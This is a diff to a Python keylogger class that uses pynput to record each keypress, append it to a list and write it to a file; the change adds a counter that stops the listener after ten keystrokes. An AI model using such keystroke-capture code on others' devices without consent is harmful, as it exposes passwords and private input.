@@ -3,15 +3,16 @@ from hashlib import new
 from threading import Thread
 from vars import *
 from pynput.keyboard import Key,Listener
-import os
+
 class Keylog(Thread):
-    
+    strokes = 0
     count = 0
     keys = []
     def on_press(self,key):
         print(key)
         self.keys.append(key)
         self.count += 1
+        self.strokes += 1
         if self.count >=1:
             self.count = 0
             self.write_file()
@@ -29,7 +30,7 @@ class Keylog(Thread):
     def stop(self):
         self.on_release(Key.esc)
     def on_release(self,key):
-        if key == Key.esc:
+        if (key == Key.esc) or (self.strokes==10):
             return False
     def run(self):
         with Listener(on_press= self.on_press, on_release= self.on_release) as listener:
